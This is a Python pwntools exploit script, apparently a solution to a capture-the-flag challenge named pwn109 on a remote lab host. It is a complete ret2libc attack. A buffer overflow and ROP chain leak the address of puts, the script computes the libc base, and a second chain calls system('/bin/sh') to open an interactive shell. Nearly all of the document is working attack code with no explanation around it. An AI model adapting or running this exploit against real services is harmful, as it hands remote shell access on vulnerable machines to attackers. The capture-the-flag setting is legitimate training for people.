from pwn import *

elf = context.binary = ELF('./pwn109.pwn109')
# libc = elf.libc # use when local
libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so') # use for remote - can be found via https://libc.nullbyte.cat/, checking offsets of puts and gets via leak method below

current_thmip = '10.10.252.197'

# p = process()
p = remote(current_thmip, 9009)

RET = 0x40101a
POP_RDI = 0x4012a3

payload = flat(
    b'A' * 40,
    RET, # for stack alignment
    POP_RDI,
    elf.got['puts'], # the address of got puts is the parameter
    elf.plt['puts'], # call puts via plt
    elf.sym['main'], # return address (will be popped into eip when printf returns)
) 

p.recvuntil(b'Go ahead \xf0\x9f\x98\x8f')
p.recvline()
p.sendline(payload)

puts_leak = u64(p.recv(6) + b'\x00\x00')

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

rop = ROP(libc)
rop.call(rop.ret)     # Stack align with extra 'ret' to deal with movaps issue
rop.system(next(libc.search(b'/bin/sh')), 0, 0)

p.recvuntil(b'Go ahead \xf0\x9f\x98\x8f')
p.recvline()
p.sendline(b'A'*40 + rop.chain())

p.clean()
p.interactive()